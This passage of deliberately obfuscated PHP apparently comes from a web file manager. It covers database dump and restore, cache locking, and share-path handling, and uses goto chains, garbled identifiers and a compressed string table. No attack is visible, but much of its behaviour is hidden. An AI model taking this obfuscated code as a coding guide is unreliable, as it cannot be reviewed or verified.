$aí°µÁó) { if ($fÊáìºÇ»Ü) { $Dô´¸® ™ = stripos($aí°µÁó, $F¬©Ü±æ–¢[1020]) === 0; if ($Dô´¸® ™) { $fÊáìºÇ»Ü->task[$F¬©Ü±æ–¢[1021]] += 1; } } $this->model()->db()->execute($aí°µÁó); if ($fÊáìºÇ»Ü && $Dô´¸® ™) { preg_match($F¬©Ü±æ–¢[1022], $aí°µÁó, $b¥áßÚ”); $fÊáìºÇ»Ü->task[$F¬©Ü±æ–¢[1023]] = $b¥áßÚ”[1]; $fÊáìºÇ»Ü->update(1); } } $this->taskToCache($fÊáìºÇ»Ü); } public function insertTable($cÉÏè“ø¬ä, $BñÆ¿×°ˆ = null) { $a¤åÜ³‚ç“ =& $_SERVER[Ç³Íß¦Ó]; $c¢Á—ÔÖÉÎ = $this->model()->db(); $aƒˆÀ«ù¿º = $cò…Øì›è ? array($cò…Øì›è) : $c¢Á—ÔÖÉÎ->getTables(); foreach ($cÉÏè“ø¬ä as $FÓç—†Ÿ¥È) { $cò…Øì›è = basename($FÓç—†Ÿ¥È, $a¤åÜ³‚ç“[747]); if (!in_array($cò…Øì›è, $aƒˆÀ«ù¿º)) { continue; } if ($BñÆ¿×°ˆ) { $BñÆ¿×°ˆ->task[$a¤åÜ³‚ç“[1023]] = $cò…Øì›è; } if (get_filesize($FÓç—†Ÿ¥È) == 0) { continue; } $bÎ¸Ûí­õµ = $this->sqlToDb($FÓç—†Ÿ¥È, $BñÆ¿×°ˆ); if (!$bÎ¸Ûí­õµ) { ActionCall($a¤åÜ³‚ç“[1018], !0, 0); show_json(LNG($a¤åÜ³‚ç“[1024]) . "\133{$cò…Øì›è}\x5d", !1); } } $this->taskToCache($BñÆ¿×°ˆ); } public function sqlFromDb($B¾¨„¼ùÙ…, $b‡¬ˆö¿‰†, $AÁöæÅ¡Â = null, $d“×›İÈ«¿ = null) { goto EœôáÑã‘ª; EœôáÑã‘ª: if ($AÁöæÅ¡Â) { $AÁöæÅ¡Â->task[$_SERVER[Ç³Íß¦Ó][1023]] = $B¾¨„¼ùÙ…; } $fù¹¤÷åîÜ = $this->model($B¾¨„¼ùÙ…); $b²ÕˆÓ¸ëÒ = 0; goto Dõ±ëÌ¶Œ; fù¸Ÿå‹›: fclose($AáàÇÚá—); return $b²ÕˆÓ¸ëÒ; goto F‡«îÎâ‰; Dõ±ëÌ¶Œ: $f£Ã–Í˜Œ = 0; $cƒ¯±¤Ùºğ = 10000; $AáàÇÚá— = fopen($b‡¬ˆö¿‰†, $_SERVER[Ç³Íß¦Ó][1025]); goto b…Ù£ÉŠß¦; b…Ù£ÉŠß¦: $cÒƒåÀÛÊ‰ = $fù¹¤÷åîÜ->getPk(); $eâ“À¡  = $fù¹¤÷åîÜ->getDbFields(); do { $Eœ‡ñç¨ = array($cÒƒåÀÛÊ‰ => array($_SERVER[Ç³Íß¦Ó][971], $f£Ã–Í˜Œ)); $E˜Â›ˆ²Ã¨ = $fù¹¤÷åîÜ->where($Eœ‡ñç¨)->field($eâ“À¡ )->order($cÒƒåÀÛÊ‰ . $_SERVER[Ç³Íß¦Ó][1026])->limit($cƒ¯±¤Ùºğ)->select(); $E˜Â›ˆ²Ã¨ = !empty($E˜Â›ˆ²Ã¨) ? $E˜Â›ˆ²Ã¨ : array(); if (!($D¸ãÜ‚óñÑ = count($E˜Â›ˆ²Ã¨))) { break; } $fˆ·Êå©‘­ = end($E˜Â›ˆ²Ã¨); $f£Ã–Í˜Œ = $fˆ·Êå©‘­[$cÒƒåÀÛÊ‰]; $FÚŒ×Å‰ŠÏ = array(); foreach ($E˜Â›ˆ²Ã¨ as $DÌ˜å¼¨çÚ) { if ($B¾¨„¼ùÙ… == $_SERVER[Ç³Íß¦Ó][1027] && $DÌ˜å¼¨çÚ[$_SERVER[Ç³Íß¦Ó][29]] == $_SERVER[Ç³Íß¦Ó][1028]) { $a‡ÜƒºèÀ– = json_decode($DÌ˜å¼¨çÚ[$_SERVER[Ç³Íß¦Ó][371]], !0); if ($a‡ÜƒºèÀ–[$_SERVER[Ç³Íß¦Ó][28]] == date($_SERVER[Ç³Íß¦Ó][715]) && !$a‡ÜƒºèÀ–[$_SERVER[Ç³Íß¦Ó][714]]) { continue; } } if ($d“×›İÈ«¿) { $DÌ˜å¼¨çÚ[$_SERVER[Ç³Íß¦Ó][76]] = "\x7b\151\x6f\72{$d“×›İÈ«¿}\175" . substr($DÌ˜å¼¨çÚ[$_SERVER[Ç³Íß¦Ó][76]], strlen("\173\x69\157\x3a{$DÌ˜å¼¨çÚ[$_SERVER[Ç³Íß¦Ó][783]]}\175")); $DÌ˜å¼¨çÚ[$_SERVER[Ç³Íß¦Ó][783]] = $d“×›İÈ«¿; } $FÚŒ×Å‰ŠÏ[] = $_SERVER[Ç³Íß¦Ó][1029] . $this->sqlEncode($DÌ˜å¼¨çÚ) . $_SERVER[Ç³Íß¦Ó][1030]; } $cÓˆ¼ ·ÈÆ = "\111\x4e\123\105\x52\124\40\111\116\124\117\x20\x60{$B¾¨„¼ùÙ…}\x60\40\x28\140" . implode($_SERVER[Ç³Íß¦Ó][1031], $eâ“À¡ ) . $_SERVER[Ç³Íß¦Ó][1032]; fwrite($AáàÇÚá—, $cÓˆ¼ ·ÈÆ . implode($_SERVER[Ç³Íß¦Ó][1033], $FÚŒ×Å‰ŠÏ) . $_SERVER[Ç³Íß¦Ó][68] . PHP_EOL); $b²ÕˆÓ¸ëÒ += $D¸ãÜ‚óñÑ; if ($AÁöæÅ¡Â) { $AÁöæÅ¡Â->update($D¸ãÜ‚óñÑ); } } while ($cƒ¯±¤Ùºğ == $D¸ãÜ‚óñÑ); goto fù¸Ÿå‹›; F‡«îÎâ‰: } public function sqlToDb($CŞÕ«÷¡õ, $DÍôîŸÇÆ¿ = null) { goto eÜÓİ¦‡Ú; eÜÓİ¦‡Ú: $AÅ†­©ëù­ =& $_SERVER[Ç³Íß¦Ó]; $b›ÓöàÌ‰ = $this->model()->db(); $D§©Å¯ºó = @fopen($CŞÕ«÷¡õ, $AÅ†­©ëù­[1034]); goto b®é’»íç¼; b®é’»íç¼: if (!$D§©Å¯ºó) { return !1; } $AªÏèíˆÎ© = 0; $Cœ·¤íƒ·Ç = $AÅ†­©ëù­[33]; goto c’ğ¾¢—í»; BŒ‹ÌğÚ¹ï: if (!empty($C†ŞĞÒÓí‹)) { $c±óµº = $Cœ·¤íƒ·Ç . implode($AÅ†­©ëù­[47], $C†ŞĞÒÓí‹); if (!$b›ÓöàÌ‰->execute($c±óµº)) { return !1; } if ($DÍôîŸÇÆ¿) { $DÍôîŸÇÆ¿->update($AªÏèíˆÎ©); } } return !0; goto EÖç¡’™…; c’ğ¾¢—í»: $C†ŞĞÒÓí‹ = array(); $e‘İƒÎ£¥… = $this->type == $AÅ†­©ëù­[9] ? 500 : 2000; $aĞùàŞ„‚Ò = basename($CŞÕ«÷¡õ, $AÅ†­©ëù­[747]); goto b…°Û·¢ö¹; b…°Û·¢ö¹: if ($aĞùàŞ„‚Ò == $AÅ†­©ëù­[1035]) { $e‘İƒÎ£¥… = 50; } while (!feof($D§©Å¯ºó)) { $fŒìŸôÊª = trim(fgets($D§©Å¯ºó)); if (!$fŒìŸôÊª) { continue; } $c±óµº = $this->sqlDecode($fŒìŸôÊª, $this->type); if (stripos($c±óµº, $AÅ†­©ëù­[354]) === 0) { if (!$Cœ·¤íƒ·Ç) { $Cœ·¤íƒ·Ç = $c±óµº . $AÅ†­©ëù­[50]; } continue; } if ($DÍôîŸÇÆ¿) { $DÍôîŸÇÆ¿->task[$AÅ†­©ëù­[1021]] += 1; } $AªÏèíˆÎ©++; $C†ŞĞÒÓí‹[] = rtrim(rtrim(trim($c±óµº), $AÅ†­©ëù­[47]), $AÅ†­©ëù­[68]); if ($AªÏèíˆÎ© >= $e‘İƒÎ£¥…) { $c±óµº = $Cœ·¤íƒ·Ç . implode($AÅ†­©ëù­[47], $C†ŞĞÒÓí‹); if (!$b›ÓöàÌ‰->execute($c±óµº)) { return !1; } if ($DÍôîŸÇÆ¿) { $DÍôîŸÇÆ¿->update($AªÏèíˆÎ©); } $C†ŞĞÒÓí‹ = array(); $AªÏèíˆÎ© = 0; } } fclose($D§©Å¯ºó); goto BŒ‹ÌğÚ¹ï; EÖç¡’™…: } public function dropTable($D´Ê¶ê˜ = null) { $D¤Ç¿Å¥ç = $this->model()->db(); $b¿à£å¶¸ = $D´Ê¶ê˜ ? array($D´Ê¶ê˜) : $D¤Ç¿Å¥ç->getTables(); if (!$b¿à£å¶¸) { return; } foreach ($b¿à£å¶¸ as $D´Ê¶ê˜) { $D¤Ç¿Å¥ç->execute("\144\x72\157\x70\x20\164\141\x62\154\x65\x20\x69\146\x20\x65\x78\151\163\x74\x73\x20\140{$D´Ê¶ê˜}\140"); } } private function taskToCache($Bõ†¨–öÕ = null) { $f›’Š…â†˜ =& $_SERVER[Ç³Íß¦Ó]; if (!$Bõ†¨–öÕ) { return; } $dæ¬¤Î«¾ = array($f›’Š…â†˜[1023] => $Bõ†¨–öÕ->task[$f›’Š…â†˜[1023]], $f›’Š…â†˜[1021] => $Bõ†¨–öÕ->task[$f›’Š…â†˜[1021]], $f›’Š…â†˜[1036] => $Bõ†¨–öÕ->task[$f›’Š…â†˜[1036]]); if ($dæ¬¤Î«¾[$f›’Š…â†˜[1021]] == $dæ¬¤Î«¾[$f›’Š…â†˜[1036]]) { $dæ¬¤Î«¾[$f›’Š…â†˜[721]] = 1; } Cache::set($f›’Š…â†˜[1037] . $Bõ†¨–öÕ->task[$f›’Š…â†˜[392]], $dæ¬¤Î«¾); $Bõ†¨–öÕ->end(); } private function sqlEncode($b–µÜ ‰×Î) { $EíùÕÂ»Æ =& $_SERVER[Ç³Íß¦Ó]; $D—‘ÒåÙ–Ã = array(); foreach ($b–µÜ ‰×Î as $d´Â½Ò†²) { if (is_array($d´Â½Ò†²)) { $d´Â½Ò†² = json_encode_force($d´Â½Ò†²); } $d´Â½Ò†² = addslashes($d´Â½Ò†²); $d´Â½Ò†² = str_replace(array($EíùÕÂ»Æ[1038], $EíùÕÂ»Æ[228]), array($EíùÕÂ»Æ[1039], $EíùÕÂ»Æ[1040]), $d´Â½Ò†²); $D—‘ÒåÙ–Ã[] = str_replace($EíùÕÂ»Æ[55], $EíùÕÂ»Æ[1041], $d´Â½Ò†²); } return $EíùÕÂ»Æ[55] . implode($EíùÕÂ»Æ[1042], $D—‘ÒåÙ–Ã) . $EíùÕÂ»Æ[55]; } private function sqlDecode($a£Ï“±µ¥, $DîÂ¼®È) { $bá¤—Ä“å =& $_SERVER[Ç³Íß¦Ó]; $a£Ï“±µ¥ = str_replace(array($bá¤—Ä“å[1039], $bá¤—Ä“å[1040]), array($bá¤—Ä“å[1038], $bá¤—Ä“å[228]), $a£Ï“±µ¥); if ($DîÂ¼®È == $bá¤—Ä“å[9]) { $a£Ï“±µ¥ = stripslashes($a£Ï“±µ¥); } return $a£Ï“±µ¥; } } goto B£ˆÜö; d‰è±¶Øï: class CacheLockMemcached { public function lock($EÛ®¾¤æ–©, $FÚ»¾Ûˆñá = 0) { $a³Âñ¬´æ‡ = Cache::init(); $DÌ÷Ò¥™±Ê = microtime(!0) + $FÚ»¾Ûˆñá; while (microtime(!0) < $DÌ÷Ò¥™±Ê) { $eÔÆ“–¯š® = $a³Âñ¬´æ‡->get($EÛ®¾¤æ–©); if (!$eÔÆ“–¯š® || $eÔÆ“–¯š® < microtime(!0)) { $c„Ü™¨Œ = $a³Âñ¬´æ‡->handle->add($EÛ®¾¤æ–©, $DÌ÷Ò¥™±Ê, $FÚ»¾Ûˆñá); if ($c„Ü™¨Œ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Dš·Òñˆ®) { return Cache::init()->get($Dš·Òñˆ®); } public function unlock($c‚ë³³µ°„) { return Cache::init()->remove($c‚ë³³µ°„); } } class CacheLockDatabase { public function lock($fĞö´ÌåÈ, $e‹šÛŒ¡ß = 0) { $Bò–„ëœ»£ = Model($_SERVER[Ç³Íß¦Ó][795]); $A§©å¡î = microtime(!0) + $e‹šÛŒ¡ß; while (microtime(!0) < $A§©å¡î) { $Dê³¬«ÁÉÅ = $Bò–„ëœ»£->get($fĞö´ÌåÈ); if (!$Dê³¬«ÁÉÅ || $Dê³¬«ÁÉÅ < microtime(!0)) { $d×œÍÙœÑ¶ = $Bò–„ëœ»£->set($fĞö´ÌåÈ, $A§©å¡î); if ($d×œÍÙœÑ¶) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($D–ƒÆØ—‹) { return Model($_SERVER[Ç³Íß¦Ó][795])->get($D–ƒÆØ—‹); } public function unlock($cëÍŠ”) { Model($_SERVER[Ç³Íß¦Ó][795])->remove($cëÍŠ”); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($c¯¼™¢°•…, $E—ğ•Ù©ƒ„) { $C¯´Ö¦£ƒ‹ =& $_SERVER[Ç³Íß¦Ó]; if (!class_exists($C¯´Ö¦£ƒ‹[822])) { show_json($C¯´Ö¦£ƒ‹[823], !1); } $this->cacheTime = $E—ğ•Ù©ƒ„; $this->handle = new Memcached(); if (is_array($c¯¼™¢°•…[$C¯´Ö¦£ƒ‹[824]]) && count($c¯¼™¢°•…[$C¯´Ö¦£ƒ‹[824]]) >= 1) { foreach ($c¯¼™¢°•…[$C¯´Ö¦£ƒ‹[824]] as $CóÊâ«à¡´) { $c«ÒÂšßØ‚ = explode($C¯´Ö¦£ƒ‹[4], $CóÊâ«à¡´); $this->handle->addServer($c«ÒÂšßØ‚[0], $c«ÒÂšßØ‚[1]); } } else { $this->handle->addServer($c¯¼™¢°•…[$C¯´Ö¦£ƒ‹[175]], $c¯¼™¢°•…[$C¯´Ö¦£ƒ‹[176]]); } } public function set($Eõ£ñëÓ‡¿, $eŸÁ¾É»£Í, $Cª¼œ¨ÉŠ« = false) { $Cª¼œ¨ÉŠ« = $Cª¼œ¨ÉŠ« ? $Cª¼œ¨ÉŠ« : $this->cacheTime; return $this->handle->set($Eõ£ñëÓ‡¿, $eŸÁ¾É»£Í, $Cª¼œ¨ÉŠ«); } public function get($fáĞ«Áñ†³) { return $this->handle->get($fáĞ«Áñ†³); } public function remove($d®­—…Ô†) { return $this->handle->delete($d®­—…Ô†); } public function deleteAll() { return $this->handle->flush(); } } goto EÕæ‘°ÑÍÌ; E‚ÑçİïŒ¯: class PathDriverDbShareItem extends PathDriverDB { public function __construct($F’ø‡è½) { $this->pathParse = $F’ø‡è½; $this->model = Model($_SERVER[Ç³Íß¦Ó][1204]); } public function getPathOuter($EÑİ’ì›) { $E¶Œ£ÄÀ²… =& $_SERVER[Ç³Íß¦Ó]; if (!$EÑİ’ì›) { return $EÑİ’ì›; } $A¿†¥ÎÍÔ± = $this->parse($EÑİ’ì›); return trim(KodIO::makeShare($this->pathParse[$E¶Œ£ÄÀ²…[392]], $A¿†¥ÎÍÔ±[$E¶Œ£ÄÀ²…[392]]), $E¶Œ£ÄÀ²…[8]); } protected function infoParse($f³³ó¼ÆÅÔ, $d›â’â–ëÉ = false, $CğÛö¯¡ = false) { $f©³êÍ÷“­ =& $_SERVER[Ç³Íß¦Ó]; $Bæ‚Óà ø = $this->pathParse[$f©³êÍ÷“­[392]]; $B²ç°«Í¦ª = trim($this->pathParse[$f©³êÍ÷“­[1064]], $f©³êÍ÷“­[8]); return Action($f©³êÍ÷“­[1212])->sharePathInfo($Bæ‚Óà ø, $B²ç°«Í¦ª); } public function infoFull($B®•ä¼Äñƒ) { $eá„¥Ÿáõî =& $_SERVER[Ç³Íß¦Ó]; $A®«À˜¢åˆ = explode($eá„¥Ÿáõî[8], trim($B®•ä¼Äñƒ, $eá„¥Ÿáõî[8])); if (count($A®«À˜¢åˆ) > 1) { $aé‹µì†ç° = implode($eá„¥Ÿáõî[8], array_splice($A®«À˜¢åˆ, 1)); $còäˆ¶çôƒ = $this->model->pathInfoByPath($A®«À˜¢åˆ[0], $aé‹µì†ç°); if (!$còäˆ¶çôƒ) { return !1; } $this->pathParse[$eá„¥Ÿáõî[1064]] = $còäˆ¶çôƒ[$eá„¥Ÿáõî[394]]; } return $this->infoParse($B®•ä¼Äñƒ); } public function listAll($dâÅ™„é˜â) { goto aÜ¾ÊÙ•Ù’; aÜ¾ÊÙ•Ù’: $c»§ÄĞ½§Å =& $_SERVER[Ç³Íß¦Ó]; $f¸Ÿ±õ‚á = IO::info($this->pathParse[$c»§ÄĞ½§Å[76]]); if (!$f¸Ÿ±õ‚á) { return array(); } goto CßˆíÖòÆ; aª„—ÔÆ¦õ: foreach ($c¤Ë›÷ÈÏ as &$AÎ‡Ğ‡ÈÓµ) { check_abort(); $AÎ‡Ğ‡ÈÓµ[$c»§ÄĞ½§Å[85]] = $AÉñ„œ´ä->_shareItemeParse($AÎ‡Ğ‡ÈÓµ[$c»§ÄĞ½§Å[85]], $a‰Ğ‹­óĞ); } unset($AÎ‡Ğ‡ÈÓµ); return $c¤Ë›÷ÈÏ; goto Bğ„çäìİ×; CßˆíÖòÆ: $c¤Ë›÷ÈÏ = $this->model->listAll($dâÅ™„é˜â); $a‰Ğ‹­óĞ = Model($c»§ÄĞ½§Å[562])->getInfo($f¸Ÿ±õ‚á[$c»§ÄĞ½§Å[466]]); $AÉñ„œ´ä = Action($c»§ÄĞ½§Å[1212]); goto aª„—ÔÆ¦õ; Bğ„çäìİ×: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($bîˆ¢Íæâ‰) { $this->pathParse = $bîˆ¢Íæâ‰; $this->model = Model($_SERVER[Ç³Íß¦Ó][1204]); } protected function infoParse($EÀœ£è……Ñ, $fŒÎïâ³à² = false, $fİ¥Û–¨Ú‰ = false) { $AÈÄÃÃœé´ =& $_SERVER[Ç³Íß¦Ó]; return Action($AÈÄÃÃœé´[1070])->sharePathInfo($this->pathParse[$AÈÄÃÃœé´[76]], !0); } public function listPath($f¢ÅÂÒ÷ƒ†, $a­Ù˜£Ê® = false) { $a‘ŠŠ–éÇ =& $_SERVER[Ç³Íß¦Ó]; $BŞ–øö‰³‰ = parent::listPath($f¢ÅÂÒ÷ƒ†, $a­Ù˜£Ê®); foreach ($BŞ–øö‰³‰ as $eÄÀ’ÍÃ“É => $d”›æ»İÀ) { if (!in_array($eÄÀ’ÍÃ“É, array($a‘ŠŠ–éÇ[74], $a‘ŠŠ–éÇ[75]))) { continue; } foreach ($d”›æ»İÀ as $E‡òµ’¨ÙŒ => $C˜æ¿Â´À) { $BŞ–øö‰³‰[$eÄÀ’ÍÃ“É][$E‡òµ’¨ÙŒ] = Action($a‘ŠŠ–éÇ[1070])->shareItemInfo($C˜æ¿Â´À); } } return $BŞ–øö‰³‰; } public function listAll($e’©…İõƒÁ) { goto B‘«†á¬¼î; B‘«†á¬¼î: $eÌÄœ‘Œ =& $_SERVER[Ç³Íß¦Ó]; $cíĞöá‹çï = IO::info($this->pathParse[$eÌÄœ‘Œ[76]]); if (!$cíĞöá‹çï) { return array(); } goto E×§‘ß” ; Cœˆ»Õëâ¼: return $AÆî’¼°ÎÆ; goto f×¼ï‘…À›; E×§‘ß” : $AÆî’¼°ÎÆ = $this->model->listAll($e’©…İõƒÁ); foreach ($AÆî’¼°ÎÆ as &$Aƒìñòé¸§) { $Aƒìñòé¸§[$eÌÄœ‘Œ[85]] = Action($eÌÄœ‘Œ[1070])->shareItemInfo($Aƒìñòé¸§[$eÌÄœ‘Œ[85]]); } unset($Aƒìñòé¸§); goto Cœˆ»Õëâ¼; f×¼ï‘…À›: } } class PathDriverDriverShareItem { public function __construct($DøòæÚÉç®) { $this->pathParse = $DøòæÚÉç®; } public function __call($CÇìÌìºÙë, $AØºù¢é²) { $Aššñ‘©ˆ— =& $_SERVER[Ç³Íß¦Ó]; if (method_exists($this, $CÇìÌìºÙë)) { return; } $AŸŠòÅ£§» = call_user_func_array(array($Aššñ‘©ˆ—[1213], $CÇìÌìºÙë), $AØºù¢é²); $c”°‰­¯ = array($Aššñ‘©ˆ—[1214], $Aššñ‘©ˆ—[1215], $Aššñ‘©ˆ—[1216], $Aššñ‘©ˆ—[1217], $Aššñ‘©ˆ—[517], $Aššñ‘©ˆ—[519], $Aššñ‘©ˆ—[1218], $Aššñ‘©ˆ—[107], $Aššñ‘©ˆ—[1219], $Aššñ‘©ˆ—[1220]); if (in_array($CÇìÌìºÙë, $c”°‰­¯)) { $AŸŠòÅ£§» = $this->getPathOuter($AŸŠòÅ£§»); } return $AŸŠòÅ£§»; } public function copy($dŞŒñ¢¾«, $c‘ä¼‹™ßˆ, $A‡è†ù ¿ = false) { return $this->copyMove($dŞŒñ¢¾«, $c‘ä¼‹™ßˆ, $A‡è†ù ¿, $_SERVER[Ç³Íß¦Ó][517]); } public function move($a÷ÕŞ§âå«, $FÍœÆ”Ö, $fÇõ¸ÃÅ½œ = false) { return $this->copyMove($a÷ÕŞ§âå«, $FÍœÆ”Ö, $fÇõ¸ÃÅ½œ, $_SERVER[Ç³Íß¦Ó][519]); } private function copyMove($Aòå©èì´, $C·¤…æ¦”, $B¬¥öŠ§’³, $eæï‚Şö”¬) { goto aà¸£Œøî; Bù×Ùº‰Œ: return $aæÜêê‰åÒ; goto dÖ¬¼â²†¹; aŒê²¨½: if ($fÕâº„â‰é->pathParse[$DïÏ÷¶Î‚Ä[1048]]) { $C·¤…æ¦” = $fÕâº„â‰é->pathParse[$DïÏ÷¶Î‚Ä[1048]]; } else { $C·¤…æ¦” = $cÎéÍ‡„®; } $aæÜêê‰åÒ = IO::copyMove($Aòå©èì´, $C·¤…æ¦”, $B¬¥öŠ§’³, $eæï‚Şö”¬); $aæÜêê‰åÒ = $this->getPathOuter($aæÜêê‰åÒ); goto Bù×Ùº‰Œ; aà¸£Œøî: $DïÏ÷¶Î‚Ä =& $_SERVER[Ç³Íß¦Ó]; $cÎéÍ‡„® = $C·¤…æ¦”; $fÕâº„â‰é = IO::driverMake($C·¤…æ¦”); goto aŒê²¨½; dÖ¬¼â²†¹: } public function pathThis($c‚‘ŞÚ–ÑÌ) { return get_path_this($this->pathParse[$_SERVER[Ç³Íß¦Ó][76]]); } public function pathFather($F‘¿ƒ‡ìâÉ) { return get_path_father($this->pathParse[$_SERVER[Ç³Íß¦Ó][76]]); } public function iconvSystem($bÖØõ¡¯„) { return $bÖØõ¡¯„; } protected function infoParse($BÕÜ¹ô–é«, $bààÕãƒÕ = false) { $cÁªÄï½˜’ =& $_SERVER[Ç³Íß¦Ó]; $Fãµ–•åÑŒ = $this->pathParse[$cÁªÄï½˜’[464]][$cÁªÄï½˜’[1071]] . $this->pathParse[$cÁªÄï½˜’[1064]]; if ($bààÕãƒÕ) { $fŠŞ‚Œëô = IO::infoWithChildren($Fãµ–•åÑŒ); } else { $fŠŞ‚Œëô = IO::info($Fãµ–•åÑŒ); } $e’ÄßÊ¡æ… = $this->pathParse[$cÁªÄï½˜’[464]]; return Action($cÁªÄï½˜’[1212])->_shareItemeParse($fŠŞ‚Œëô, $e’ÄßÊ¡æ…); } public function listAll($Dã´Úô„¶ö) { $F¡Îµ›©ï =& $_SERVER[Ç³Íß¦Ó]; $Bàè¢ŸØ·æ = IO::listAll($Dã´Úô„¶ö); $b•³¨ÍÑ• = $this->pathParse[$F¡Îµ›©ï[464]]; foreach ($Bàè¢ŸØ·æ as &$fÖŠš–Œá´) { check_abort(); $FùÛäó¨˜ = IO::info($fÖŠš–Œá´[$F¡Îµ›©ï[76]]); $FùÛäó¨˜ = is_array($FùÛäó¨˜) ? $FùÛäó¨˜ : array(); $fÖŠš–Œá´ = array_merge($FùÛäó¨˜, $fÖŠš–Œá´); $fÖŠš–Œá´[$F¡Îµ›©ï[85]] = Action($F¡Îµ›©ï[1212])->_shareItemeParse($fÖŠš–Œá´, $b•³¨ÍÑ•); } unset($fÖŠš–Œá´); return $Bàè¢ŸØ·æ; } public function getPathOuter($cÎ÷ê›˜Œ) { goto DÀˆÙã¾„Ü; cìïº›µÂ: $b·ªù‡¢¢¹ = KodIO::clear($cÎ÷ê›˜Œ); $Dº¶à¨Ë‘× = KodIO::clear($this->pathParse[$F´ˆ°–ã‘”[464]][$F´ˆ°–ã‘”[1071]]); $c¿¦Ñß²ÎŸ = substr($b·ªù‡¢¢¹, strlen($Dº¶à¨Ë‘×)); goto Fô¦‰Ì÷¬; DÀˆÙã¾„Ü: $F´ˆ°–ã‘” =& $_SERVER[Ç³Íß¦Ó]; $bìà‰«åÍğ = KodIO::parse($cÎ÷ê›˜Œ); if ($bìà‰«åÍğ[$F´ˆ°–ã‘”[29]] == KodIO::KOD_SHARE_ITEM) { return $bìà‰«åÍğ[$F´ˆ°–ã‘”[76]]; } goto cìïº›µÂ; Fô¦‰Ì÷¬: if (substr($b·ªù‡¢¢¹, 0, strlen($Dº¶à¨Ë‘×)) != $Dº¶à¨Ë‘×) { return !1; } return $this->pathParse[$F´ˆ°–ã‘”[1065]] . $F´ˆ°–ã‘”[8] . ltrim($c¿¦Ñß²ÎŸ, $F´ˆ°–ã‘”[8]); goto fùŠµƒ…˜ã; fùŠµƒ…˜ã: } public function getType() { $a‚„•“×ò¼ =& $_SERVER[Ç³Íß¦Ó]; $BÜ¨”‚Ü°‘ = str_replace($a‚„•“×ò¼[72], $a‚„•“×ò¼[33], get_class($this)); return strtolower($BÜ¨”‚Ü°‘); } public function isTypeObject($eµğÊÍ™çĞ) { return IO::isTypeObject($eµğÊÍ™çĞ); } public function info($c¸ŸŠ’¸Âñ) { return $this->infoParse($c¸ŸŠ’¸Âñ); } public function infoAuth($D÷ùƒ×«ó) { return $this->infoParse($D÷ùƒ×«ó); } public function infoWithChildren($aÓ²æ¬Â‡£) { return $this->infoParse($aÓ²æ¬Â‡£, !0); } public function infoFull($aÁíÄ—Ï) { return $this->infoParse($aÁíÄ—Ï); } } goto Bš™…šÕéÅ; BÅ­«¡Á›ä: $D¾§¥¼ÎÆ÷ = $_SERVER[Ç³Íß¦Ó][573]; while (strlen($D¾§¥¼ÎÆ÷) < $_SERVER[Ç³Íß¦Ó][574]) { if (!$D¾§¥¼ÎÆ÷) { break; } $D¾§¥¼ÎÆ÷++; } $_SERVER[øÜ] = explode($_SERVER[Ç³Íß¦Ó][575], gzinflate(substr($_SERVER[Ç³Íß¦Ó][576], 10, -8))); goto fŒòÛ³Åñ; cõÕ´å£æ…: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $e¿Š¨¨ßç =& $_SERVER[Ç³Íß¦Ó]; $a™â“ñÏö = $GLOBALS[$e¿Š¨¨ßç[6]][$e¿Š¨¨ßç[346]]; self::$cachePath = $a™â“ñÏö[$e¿Š¨¨ßç[192]][$e¿Š¨¨ßç[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($DÎ‚ŸÌ´«„, $bŠÅšøá² = 0) { goto Aâñß˜”õ¶; Aâñß˜”õ¶: $dš¢ƒŠ§Ğ =& $_SERVER[Ç³Íß¦Ó]; $B‚äê°¦¸Ô = microtime(!0); $aƒÕØ…ºâ¥ = $B‚äê°¦¸Ô + $bŠÅšøá² + 0.0001; goto eˆ”æ„ì¡‡; a©¬¦Û¢ğ: $this->unlock($DÎ‚ŸÌ´«„); return !1; goto Eœ…§ö˜š; eˆ”æ„ì¡‡: $b¾å•ÂİŒ³ = rtrim(self::$cachePath, $dš¢ƒŠ§Ğ[8]) . $dš¢ƒŠ§Ğ[819] . md5($DÎ‚ŸÌ´«„) . $dš¢ƒŠ§Ğ[816]; if (file_exists($b¾å•ÂİŒ³) && filemtime($b¾å•ÂİŒ³) && filemtime($b¾å•ÂİŒ³) < time() - 10) { @unlink($b¾å•ÂİŒ³); } do { if (file_exists($b¾å•ÂİŒ³)) { cacheLockWait(); continue; } $CŠ¯ÒĞÛª‹ = fopen($b¾å•ÂİŒ³, $dš¢ƒŠ§Ğ[820]); if (!$CŠ¯ÒĞÛª‹) { return !1; } $C«‹ßá¿ĞÏ = flock($CŠ¯ÒĞÛª‹, LOCK_EX | LOCK_NB); self::$caches[$DÎ‚ŸÌ´«„] = array($dš¢ƒŠ§Ğ[821] => $CŠ¯ÒĞÛª‹, $dš¢ƒŠ§Ğ[192] => $b¾å•ÂİŒ³); fwrite($CŠ¯ÒĞÛª‹, $aƒÕØ…ºâ¥); clearstatcache(); if ($CŠ¯ÒĞÛª‹ && $C«‹ßá¿ĞÏ) { return !0; } cacheLockWait(); } while (microtime(!0) < $aƒÕØ…ºâ¥); goto a©¬¦Û¢ğ; Eœ…§ö˜š: } public function lockGet($fåŞË°„) { $e´„ÛÜ…¨Û =& $_SERVER[Ç³Íß¦Ó]; $CÇÎÖ¾÷º = rtrim(self::$cachePath, $e´„ÛÜ…¨Û[8]) . $e´„ÛÜ…¨Û[819] . md5($fåŞË°„) . $e´„ÛÜ…¨Û[816]; return file_exists($CÇÎÖ¾÷º); } public function unlock($d¼˜×Š˜ß÷) { goto A®†Œ½ˆ£ê; A‹¶©¼®ß½: @flock($f–ƒ‡§Ÿ[$dî»±…±Šì[821]], LOCK_UN); @fclose($f–ƒ‡§Ÿ[$dî»±…±Šì[821]]); @unlink($f–ƒ‡§Ÿ[$dî»±…±Šì[192]]); goto dê·ö³ƒƒË; A®†Œ½ˆ£ê: $dî»±…±Šì =& $_SERVER[Ç³Íß¦Ó]; $f–ƒ‡§Ÿ = self::$caches[$d¼˜×Š˜ß÷]; if (!$f–ƒ‡§Ÿ) { return; } goto A‹¶©¼®ß½; dê·ö³ƒƒË: unset(self::$caches[$d¼˜×Š˜ß÷]); goto bÎí¬´©šÇ; bÎí¬´©šÇ: } } class CacheLockRedis { public function lock($b ©ÒŸ¥Ì, $F•÷ëÏİô = 10) { $b¦À’ÌÂˆ = 